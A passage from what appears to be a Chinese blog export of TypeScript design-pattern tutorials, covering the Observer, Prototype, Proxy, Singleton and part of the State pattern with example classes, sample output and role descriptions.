<p><em>注意事项：1、避免循环引用。2、如果顺序执行，某一观察者错误会导致系统卡壳，一般采用异步方式。</em></p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h5 id="Observer-ts-表示观察者的接口"><a href="#Observer-ts-表示观察者的接口" class="headerlink" title="Observer.ts 表示观察者的接口"></a>Observer.ts 表示观察者的接口</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import NumberGenerator from &quot;.&#x2F;NumberGenerator&quot;;</span><br><span class="line"></span><br><span class="line">export interface Observer &#123;</span><br><span class="line">    update(generator: NumberGenerator): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="NumberGenerator-ts-表示生产数值对象的抽象类"><a href="#NumberGenerator-ts-表示生产数值对象的抽象类" class="headerlink" title="NumberGenerator.ts 表示生产数值对象的抽象类"></a>NumberGenerator.ts 表示生产数值对象的抽象类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Observer &#125; from &quot;.&#x2F;Observer&quot;;</span><br><span class="line"></span><br><span class="line">export default abstract class NumberGenerator &#123;</span><br><span class="line">    private observers: Array&lt;Observer&gt; &#x3D; new Array();</span><br><span class="line">    public addObserver(observer: Observer): void &#123;&#x2F;&#x2F;注册Observe</span><br><span class="line">        this.observers.push(observer);</span><br><span class="line">    &#125;</span><br><span class="line">    public delete(observer: Observer) &#123;&#x2F;&#x2F;删除Observe</span><br><span class="line">        const index &#x3D; this.observers.indexOf(observer);</span><br><span class="line">        this.observers.splice(index, 1);</span><br><span class="line">    &#125;</span><br><span class="line">    public notifyObservers() &#123;&#x2F;&#x2F;通知被Observe对象变化</span><br><span class="line">        this.observers.forEach((observer) &#x3D;&gt; &#123;</span><br><span class="line">            observer.update(this);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    public abstract getNumber(): number;</span><br><span class="line">    public abstract execute(): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RandomNumberGenerator-ts-生产随机数的类"><a href="#RandomNumberGenerator-ts-生产随机数的类" class="headerlink" title="RandomNumberGenerator.ts 生产随机数的类"></a>RandomNumberGenerator.ts 生产随机数的类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import NumberGenerator from &quot;.&#x2F;NumberGenerator&quot;;</span><br><span class="line"></span><br><span class="line">export default class RandomNumberGenerator extends NumberGenerator &#123;</span><br><span class="line">    private num: number;</span><br><span class="line">    public getNumber(): number &#123;</span><br><span class="line">        return this.num;</span><br><span class="line">    &#125;</span><br><span class="line">    public execute(): void &#123;</span><br><span class="line">        for (let i &#x3D; 0; i &lt; 10; i++) &#123;&#x2F;&#x2F;变化10次</span><br><span class="line">            this.num &#x3D; Math.ceil(Math.random() * 30);&#x2F;&#x2F;生产随机数</span><br><span class="line">            this.notifyObservers();&#x2F;&#x2F;通知数值变化</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="DigitObserver-ts-表示以数字形式显示数值的类"><a href="#DigitObserver-ts-表示以数字形式显示数值的类" class="headerlink" title="DigitObserver.ts 表示以数字形式显示数值的类"></a>DigitObserver.ts 表示以数字形式显示数值的类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Observer &#125; from &quot;.&#x2F;Observer&quot;;</span><br><span class="line">import NumberGenerator from &quot;.&#x2F;NumberGenerator&quot;;</span><br><span class="line"></span><br><span class="line">export default class DigitObserver implements Observer &#123;</span><br><span class="line">    public update(generator: NumberGenerator) &#123;</span><br><span class="line">        console.log(&#96;DigitObserver:$&#123;generator.getNumber()&#125;&#96;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="GraphObserver-ts-表示以简单图形表示数值的类"><a href="#GraphObserver-ts-表示以简单图形表示数值的类" class="headerlink" title="GraphObserver.ts 表示以简单图形表示数值的类"></a>GraphObserver.ts 表示以简单图形表示数值的类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Observer &#125; from &quot;.&#x2F;Observer&quot;;</span><br><span class="line">import NumberGenerator from &quot;.&#x2F;NumberGenerator&quot;;</span><br><span class="line"></span><br><span class="line">export default class GraphObserver implements Observer &#123;</span><br><span class="line">    public update(generator: NumberGenerator): void &#123;</span><br><span class="line">        let str &#x3D; &#96;DigitObserver:&#96;;</span><br><span class="line">        const count: number &#x3D; generator.getNumber();</span><br><span class="line">        for (let i &#x3D; 0; i &lt; count; i++) &#123;</span><br><span class="line">            str +&#x3D; &quot;*&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        console.log(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="IncrementNumberGenerator-ts-自增数据变化"><a href="#IncrementNumberGenerator-ts-自增数据变化" class="headerlink" title="IncrementNumberGenerator.ts 自增数据变化"></a>IncrementNumberGenerator.ts 自增数据变化</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import NumberGenerator from &quot;.&#x2F;NumberGenerator&quot;</span><br><span class="line"></span><br><span class="line">export default class IncrementNumberGenerator extends NumberGenerator &#123;</span><br><span class="line">    private num: number;&#x2F;&#x2F;自增开始数据</span><br><span class="line">    private step: number;&#x2F;&#x2F;每次自增数据</span><br><span class="line">    private end: number;&#x2F;&#x2F;最大数值</span><br><span class="line">    constructor(num: number, end: number, step: number) &#123;</span><br><span class="line">        super();</span><br><span class="line">        this.num &#x3D; num;</span><br><span class="line">        this.step &#x3D; step;</span><br><span class="line">        this.end &#x3D; end;</span><br><span class="line">    &#125;</span><br><span class="line">    public getNumber(): number &#123;</span><br><span class="line">        return this.num;</span><br><span class="line">    &#125;</span><br><span class="line">    public execute(): void &#123;</span><br><span class="line">        while (this.num &lt; this.end) &#123;</span><br><span class="line">            this.notifyObservers();</span><br><span class="line">            this.num +&#x3D; this.step;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="index-ts"><a href="#index-ts" class="headerlink" title="index.ts"></a>index.ts</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import DigitObserver from &quot;.&#x2F;DigitObserver&quot;;</span><br><span class="line">import &#123; Observer &#125; from &quot;.&#x2F;Observer&quot;;</span><br><span class="line">import GraphObserver from &quot;.&#x2F;GraphObserver&quot;;</span><br><span class="line">import IncrementNumberGenerator from &quot;.&#x2F;IncrementNumberGenerator&quot;;</span><br><span class="line"></span><br><span class="line">const generator: IncrementNumberGenerator &#x3D; new IncrementNumberGenerator(10, 50, 5);</span><br><span class="line">const observer1: Observer &#x3D; new DigitObserver();</span><br><span class="line">const observer2: Observer &#x3D; new GraphObserver();</span><br><span class="line">generator.addObserver(observer1);</span><br><span class="line">generator.addObserver(observer2);</span><br><span class="line">generator.execute();</span><br></pre></td></tr></table></figure>
<h5 id="result"><a href="#result" class="headerlink" title="result"></a>result</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">******IncrementNumberGenerator********</span><br><span class="line">DigitObserver:10</span><br><span class="line">DigitObserver:**********</span><br><span class="line">DigitObserver:15</span><br><span class="line">DigitObserver:***************</span><br><span class="line">DigitObserver:20</span><br><span class="line">DigitObserver:********************</span><br><span class="line">DigitObserver:25</span><br><span class="line">DigitObserver:*************************</span><br><span class="line">DigitObserver:30</span><br><span class="line">DigitObserver:******************************</span><br><span class="line">DigitObserver:35</span><br><span class="line">DigitObserver:***********************************</span><br><span class="line">DigitObserver:40</span><br><span class="line">DigitObserver:****************************************</span><br><span class="line">DigitObserver:45</span><br><span class="line">DigitObserver:*********************************************</span><br><span class="line">******RandomNumberGenerator********</span><br><span class="line">DigitObserver:6</span><br><span class="line">DigitObserver:******</span><br><span class="line">DigitObserver:3</span><br><span class="line">DigitObserver:***</span><br><span class="line">DigitObserver:12</span><br><span class="line">DigitObserver:************</span><br><span class="line">DigitObserver:23</span><br><span class="line">DigitObserver:***********************</span><br><span class="line">DigitObserver:27</span><br><span class="line">DigitObserver:***************************</span><br><span class="line">DigitObserver:3</span><br><span class="line">DigitObserver:***</span><br><span class="line">DigitObserver:30</span><br><span class="line">DigitObserver:******************************</span><br><span class="line">DigitObserver:5</span><br><span class="line">DigitObserver:*****</span><br><span class="line">DigitObserver:29</span><br><span class="line">DigitObserver:*****************************</span><br><span class="line">DigitObserver:26</span><br><span class="line">DigitObserver:**************************</span><br></pre></td></tr></table></figure>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-df33cae6f551999c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="类图"></p>
<h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2><ul>
<li>Subject（观察对象）<br>Subject角色表示观察对象，Subject角色定义了注册观察者和删除观察者的方法，此外，它还声明了“获取现在的状态”的方法。在示例中NumberGenerator扮演该角色</li>
<li>ConcreteSubject（具体的观察对象）<br>ConcreteSubject角色表示具体的观察者对象，当自身状态变化时，它会通知所以已经注册的Observe角色，示例中RandomNumberGenerator、IncrementNumberGenerator扮演该角色</li>
<li>Observer（观察者）<br>Observer角色负责解释来自Subject角色的状态变化的通知，为此，它声明了update方法。示例中Observer接口扮演此角色</li>
<li>ConcreteObserver（具体的观察者）<br>ConcreteObserver角色表示具体的Observer。当他的update方法被调用后，它去获取要观察的对象的最新状态，在示例中，由DigitObserver、GraphObserver扮演此角色</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Prototype-Pattern(原型模式）</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Prototype-Pattern(%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
    <content><![CDATA[<p><strong>原型模式（Prototype Pattern）</strong>：是指原型实例指向创建对象的种类，并通过拷贝这些原型创建新的对象，是一种用来创建对象的模式，也就是创建一个对象作为另一个对象的prototype属性。这种类型的设计模式属于创建型模式<br>在js中原型设计模式的使用要比java、C中要简单的多。</p>
<h2 id="1、Object-create"><a href="#1、Object-create" class="headerlink" title="1、Object.create()"></a>1、Object.create()</h2><blockquote>
<p>1、定义: 创建一个可指定原型对象的并可以包含可选自定义属性的对象；<br>2、 Object.create(proto [, properties]);  可选，用于配置新对象的属性;</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方法说明</span><br><span class="line">1. proto: 要创建新对象的 原型，必须，可为 null; 这个 proto 要是已经创建的[new过]，或 对象.prototype 才有价值;</span><br><span class="line"></span><br><span class="line">2. properties: 可选，结构为:</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">     propField: &#123;</span><br><span class="line"></span><br><span class="line">           value: &#39;val&#39;|&#123;&#125;|function()&#123;&#125;,</span><br><span class="line"></span><br><span class="line">           writable: true|false,</span><br><span class="line"></span><br><span class="line">           enumerable: true|false,</span><br><span class="line"></span><br><span class="line">           configurable: true|false,</span><br><span class="line"></span><br><span class="line">           get:function()&#123;return 10&#125;,</span><br><span class="line"></span><br><span class="line">           set:function(value)&#123;&#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">自定的属性有以下的四种本置属性：</span><br><span class="line"></span><br><span class="line">value: 自定义属性值;</span><br><span class="line"></span><br><span class="line">writable: 该项值是否可编辑，默认为 false, 当为 true 时，obj.prodField 可赋值；否则只读;</span><br><span class="line"></span><br><span class="line">enumerable: 可枚举; </span><br><span class="line"></span><br><span class="line">confirurable: 可配置;</span><br><span class="line">还可以包含 set, get 访问器方法；</span><br><span class="line">其中，[set, get] 与 value 和 writable 不能同时出现；</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* 原型模式使用</span><br><span class="line"> * Object.create</span><br><span class="line"> * **&#x2F;</span><br><span class="line">const person &#x3D; &#123;</span><br><span class="line">  isHuman: false,</span><br><span class="line">  printIntroduction: function() &#123;</span><br><span class="line">    console.log(&#96;My name is $&#123;this.name&#125;. Am I human? $&#123;this.isHuman&#125;&#96;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">const me &#x3D; Object.create(person);</span><br><span class="line"></span><br><span class="line">me.name &#x3D; &#39;Matthew&#39;; &#x2F;&#x2F; &quot;name&quot; is a property set on &quot;me&quot;, but not on &quot;person&quot;</span><br><span class="line">me.isHuman &#x3D; true; &#x2F;&#x2F; inherited properties can be overwritten</span><br><span class="line"></span><br><span class="line">me.printIntroduction();</span><br><span class="line">&#x2F;&#x2F; expected output: &quot;My name is Matthew. Am I human? true&quot;</span><br></pre></td></tr></table></figure>
<h2 id="2、prototype-来创建对象变量"><a href="#2、prototype-来创建对象变量" class="headerlink" title="2、prototype 来创建对象变量"></a>2、prototype 来创建对象变量</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;***</span><br><span class="line"> * 使用prototype来创建实例对象</span><br><span class="line"> * @param name</span><br><span class="line"> * @returns &#123;createPerson.Person&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">function createPerson(name)&#123;</span><br><span class="line">  function  Person()&#123;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">  Person.prototype &#x3D; person;</span><br><span class="line">  let newPerson &#x3D; new Person();</span><br><span class="line">  newPerson.name &#x3D; name;</span><br><span class="line">  return newPerson;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">let me &#x3D; createPerson(&quot;Matthew&quot;);</span><br><span class="line">me.isHuman &#x3D; true;</span><br><span class="line"></span><br><span class="line">me.printIntroduction();</span><br><span class="line">&#x2F;&#x2F; expected output: &quot;My name is Matthew. Am I human? true&quot;</span><br></pre></td></tr></table></figure>
<h2 id="java版类图"><a href="#java版类图" class="headerlink" title="java版类图"></a><code>java版类图</code></h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-b2c242cddd8b223f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Proxy-Pattern(代理模式)</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Proxy-Pattern(%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F)/</url>
    <content><![CDATA[<p>代理模式（Proxy Pattern）：代理模式给某一个对象提供一个代理对象，并由代理对象控制对原对象的引用。这种类型的设计模式属于结构型模式。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li><strong>意图：</strong>为其他对象提供一种代理以控制对这个对象的访问。</li>
<li><strong>主要解决：</strong>不直接操作对象的情况下,对此对象进行访问。</li>
<li><strong>何时使用：</strong>想在访问一个类时做一些控制。</li>
<li><strong>应用实例：</strong>买火车票不一定在火车站买，也可以去代售点。</li>
<li><strong>优点：</strong><br>1、职责清晰。<br>2、高扩展性。<br>3、智能化。</li>
<li><strong>缺点：</strong><br>1、由于在客户端和真实主题之间增加了代理对象，因此有些类型的代理模式可能会造成请求的处理速度变慢。<br>2、实现代理模式需要额外的工作，有些代理模式的实现非常复杂。</li>
<li><strong>使用场景：</strong><br>1、远程代理。<br>2、虚拟代理。<br>3、Copy-on-Write 代理。<br>4、保护（Protect or Access）代理。<br>5、Cache代理。<br>6、防火墙（Firewall）代理。<br>7、同步化（Synchronization）代理。<br>8、智能引用（Smart Reference）代理。</li>
<li><strong>注意事项：</strong><br>1、和适配器模式的区别：适配器模式主要改变所考虑对象的接口，而代理模式不能改变所代理类的接口。<br>2、和装饰器模式的区别：装饰器模式为了增强功能，而代理模式是为了加以控制。<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h5 id="BuyHouse-ts-创建服务类接口"><a href="#BuyHouse-ts-创建服务类接口" class="headerlink" title="BuyHouse.ts 创建服务类接口"></a>BuyHouse.ts 创建服务类接口</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export interface BuyHouse &#123;</span><br><span class="line">    buyHosue(): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="BuyHouseImpl-ts-实现服务接口"><a href="#BuyHouseImpl-ts-实现服务接口" class="headerlink" title="BuyHouseImpl.ts 实现服务接口"></a>BuyHouseImpl.ts 实现服务接口</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; BuyHouse &#125; from &quot;.&#x2F;BuyHouse&quot;;</span><br><span class="line"></span><br><span class="line">export default class BuyHouseImpl implements BuyHouse &#123;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public buyHosue(): void &#123;</span><br><span class="line">        console.log(&quot;我要买房&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="BuyHouseProxy-ts-创建代理类"><a href="#BuyHouseProxy-ts-创建代理类" class="headerlink" title="BuyHouseProxy.ts 创建代理类"></a>BuyHouseProxy.ts 创建代理类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; BuyHouse &#125; from &quot;.&#x2F;BuyHouse&quot;;</span><br><span class="line"></span><br><span class="line">export default class BuyHouseProxy implements BuyHouse &#123;</span><br><span class="line">    private buyHouse: BuyHouse;</span><br><span class="line">    constructor(buyHouse: BuyHouse) &#123;</span><br><span class="line">        this.buyHouse &#x3D; buyHouse;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public buyHosue(): void &#123;</span><br><span class="line">        console.log(&quot;买房前准备&quot;);</span><br><span class="line">        this.buyHouse.buyHosue();</span><br><span class="line">        console.log(&quot;买房后装修&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="index-ts"><a href="#index-ts" class="headerlink" title="index.ts"></a>index.ts</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import BuyHouseImpl from &quot;.&#x2F;BuyHouseImpl&quot;;</span><br><span class="line">import BuyHouseProxy from &quot;.&#x2F;BuyHouseProxy&quot;;</span><br><span class="line"></span><br><span class="line">const buyHouse &#x3D; new BuyHouseImpl();</span><br><span class="line">buyHouse.buyHosue();</span><br><span class="line">const buyHouseProxy &#x3D; new BuyHouseProxy(buyHouse);</span><br><span class="line">buyHouseProxy.buyHosue();</span><br></pre></td></tr></table></figure>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><img src="https://upload-images.jianshu.io/upload_images/10024246-b4f89a6249dd3f0b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><h2 id="角色："><a href="#角色：" class="headerlink" title="角色："></a>角色：</h2></li>
<li>Subject(主体)：声明了RealSubject和Proxy的共同接口。由于存在Subject角色，所以Client角色不必在意他所使用的的究竟是RealSubject还是Proxy。</li>
<li>RealSubject（实际的主体）：也称为委托角色或者被代理角色。定义了代理对象所代表的目标对象。</li>
<li>Proxy（代理人）：也叫委托类、代理类。Proxy角色处理来自Client的请求，代理对象通常在客户端调用传递给目标对象之前或之后，执行某个操作，而不是单纯地将调用传递给目标对象。</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Singleton模式</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Singleton%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p><strong>单例模式（Singleton）</strong>这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。</p>
<blockquote>
<p>注意：<br>1、单例类只能有一个实例。<br>2、单例类必须自己创建自己的唯一实例。<br>3、单例类必须给所有其他对象提供这一实例。</p>
</blockquote>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><strong>意图：</strong>保证一个类仅有一个实例，并提供一个访问它的全局访问点。<br><strong>主要解决：</strong>一个全局使用的类频繁地创建与销毁。<br><strong>何时使用：</strong>当您想控制实例数目，节省系统资源的时候。<br><strong>关键代码：</strong>构造函数是私有的。<br><strong>优点：</strong></p>
<blockquote>
<p>1、在内存里只有一个实例，减少了内存的开销，尤其是频繁的创建和销毁实例（比如管理学院首页页面缓存）。<br>2、避免对资源的多重占用（比如写文件操作）。</p>
</blockquote>
<p><strong>缺点：</strong>没有接口，不能继承，与单一职责原则冲突，一个类应该只关心内部逻辑，而不关心外面怎么样来实例化。<br><em><strong>注意事项：getInstance() 方法中需要使用同步锁 synchronized (Singleton.class) 防止多线程同时进入造成 instance 被多次实例化。</strong></em><br><strong>TicketMaker类：</strong>饿汉模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;饿汉式，从名字上也很好理解，就是“比较勤”，实例在初始化的时候就已经建好了，不管你有没有用到，都先建好了再说。好处是没有线程安全的问题，坏处是浪费内存空间。</span><br><span class="line">export default class TicketMaker &#123;</span><br><span class="line">    private static ticketMaker: TicketMaker &#x3D; new TicketMaker();</span><br><span class="line">    private ticket: number &#x3D; 1000;</span><br><span class="line">    private constructor() &#123;</span><br><span class="line">        console.log(&quot;初始化TicketMaker&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public getNextTicketNumber(): number &#123;</span><br><span class="line">        return this.ticket++;</span><br><span class="line">    &#125;</span><br><span class="line">    public static getInstance(): TicketMaker &#123;</span><br><span class="line">        return this.ticketMaker;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><em><strong>注意：</strong></em>在饿汉模式下，如果通过new生产对象，会出现对象创建2次,可以把constructor函数设置为私有，防止通过new来生产新对象,所有函数的创建通过getInstance实现</p>
</blockquote>
<p><strong>TicketMaker类：</strong>懒汉模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;懒汉式，顾名思义就是实例在用到的时候才去创建，“比较懒”，用的时候才去检查有没有实例，如果有则返回，没有则新建。</span><br><span class="line">export default class TicketMaker &#123;</span><br><span class="line">    private static ticketMaker: TicketMaker;</span><br><span class="line">    private ticket: number &#x3D; 1000;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        console.log(&quot;初始化TicketMaker&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public getNextTicketNumber(): number &#123;</span><br><span class="line">        return this.ticket++;</span><br><span class="line">    &#125;</span><br><span class="line">    public static getInstance(): TicketMaker &#123;</span><br><span class="line">        if (!this.ticketMaker) &#123;</span><br><span class="line">            this.ticketMaker &#x3D; new TicketMaker();</span><br><span class="line">        &#125;</span><br><span class="line">        return this.ticketMaker;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>main 函数：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import TicketMaker from &quot;.&#x2F;TicketMaker&quot;;</span><br><span class="line">const ticketMaker1 &#x3D; TicketMaker.getInstance();</span><br><span class="line">for (let i &#x3D; 0; i &lt; 10; i++) &#123;</span><br><span class="line">    console.log(&#96;第$&#123;i&#125;个$&#123;ticketMaker1.getNextTicketNumber()&#125;&#96;);</span><br><span class="line">&#125;</span><br><span class="line">const ticketMaker2 &#x3D; TicketMaker.getInstance();</span><br><span class="line">for (let i &#x3D; 0; i &lt; 10; i++) &#123;</span><br><span class="line">    console.log(&#96;第$&#123;i&#125;个$&#123;ticketMaker2.getNextTicketNumber()&#125;&#96;);</span><br><span class="line">&#125;</span><br><span class="line">console.log(ticketMaker1 &#x3D;&#x3D;&#x3D; ticketMaker2);</span><br></pre></td></tr></table></figure>
<p><strong>输出：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">初始化TicketMaker</span><br><span class="line">第0个1000</span><br><span class="line">第1个1001</span><br><span class="line">第2个1002</span><br><span class="line">第3个1003</span><br><span class="line">第4个1004</span><br><span class="line">第0个1005</span><br><span class="line">第1个1006</span><br><span class="line">第2个1007</span><br><span class="line">第3个1008</span><br><span class="line">第4个1009</span><br><span class="line">true</span><br></pre></td></tr></table></figure>
<h3 id="结构："><a href="#结构：" class="headerlink" title="结构："></a>结构：</h3><p>**Singleton:**Singleton角色有一个返回唯一实例的static方法，改方法总是返回同一实例</p>
<h3 id="类图："><a href="#类图：" class="headerlink" title="类图："></a>类图：</h3><p><img src="https://upload-images.jianshu.io/upload_images/5180339-a9aade0286215a70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/246/format/webp" alt="Singleton类图"></p>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>State-Pattern模式（状态模式）</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/State-Pattern%E6%A8%A1%E5%BC%8F%EF%BC%88%E7%8A%B6%E6%80%81%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
    <content><![CDATA[<p><strong>状态模式（State Pattern）</strong>：用类来表示状态。这种类型的设计模式属于行为型模式。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li><strong>意图：</strong>用类来表示状态，允许对象在内部状态发生改变时改变它的行为</li>
<li><strong>主要解决：</strong>对象的行为依赖于它的状态（属性），并且可以根据它的状态改变而改变它的相关行为。</li>
<li><strong>如何解决：</strong>将各种具体的状态类抽象出来。</li>
<li><strong>优点：</strong><br>1、封装了转换规则。<br>2、枚举可能的状态，在枚举状态之前需要确定状态种类。<br>3、将所有与某个状态有关的行为放到一个类中，并且可以方便地增加新的状态，只需要改变对象状态即可改变对象的行为。<br>4、允许状态转换逻辑与状态对象合成一体，而不是某一个巨大的条件语句块。<br>5、可以让多个环境对象共享一个状态对象，从而减少系统中对象的个数。</li>
<li><strong>缺点：</strong><br>1、状态模式的使用必然会增加系统类和对象的个数。<br>2、状态模式的结构与实现都较为复杂，如果使用不当将导致程序结构和代码的混乱。<br>3、状态模式对”开闭原则”的支持并不太好，对于可以切换状态的状态模式，增加新的状态类需要修改那些负责状态转换的源代码，否则无法切换到新增状态，而且修改某个状态类的行为也需修改对应类的源代码。</li>
<li><strong>使用场景：</strong><br>1、行为随状态改变而改变的场景。<br>2、条件、分支语句的代替者。<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h5 id="State-ts-表示金库状态的接口"><a href="#State-ts-表示金库状态的接口" class="headerlink" title="State.ts 表示金库状态的接口"></a>State.ts 表示金库状态的接口</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Context &#125; from &quot;.&#x2F;Context&quot;;</span><br><span class="line"></span><br><span class="line">export interface State &#123;</span><br><span class="line">    doClock(context: Context, hour: number): void;</span><br><span class="line">    doUse(context: Context): void;</span><br><span class="line">    doAlarm(context: Context): void;</span><br><span class="line">    doPhone(context: Context): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="DayState-ts-表示白天状态的类，实现了State的接口"><a href="#DayState-ts-表示白天状态的类，实现了State的接口" class="headerlink" title="DayState.ts 表示白天状态的类，实现了State的接口"></a>DayState.ts 表示白天状态的类，实现了State的接口</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Context &#125; from &quot;.&#x2F;Context&quot;;</span><br><span class="line">import &#123; State &#125; from &quot;.&#x2F;State&quot;;</span><br><span class="line">import NightState from &quot;.&#x2F;NightState&quot;;</span><br><span class="line"></span><br><span class="line">export default class DayState implements State &#123;</span><br><span class="line">    private static singleton: DayState &#x3D; new DayState();</span><br><span class="line">    public static getInstance(): DayState &#123;</span><br><span class="line">        return this.singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    doClock(context: Context, hour: number): void &#123;</span><br><span class="line">        if (hour &lt; 9 || hour &gt;&#x3D; 17) &#123;</span><br><span class="line">            context.changeState(NightState.getInstance());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    doUse(context: Context): void &#123;</span><br><span class="line">        context.recordLog(&quot;使用金库（白天）&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    doAlarm(context: Context): void &#123;</span><br><span class="line">        context.callSecurityCenter(&quot;按下警铃（白天）&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">    doPhone(context: Context): void &#123;</span><br><span class="line">        context.callSecurityCenter(&quot;正常通话（白天）&quot;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public toString(): string &#123;</span><br><span class="line">        return &quot;[白天]&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
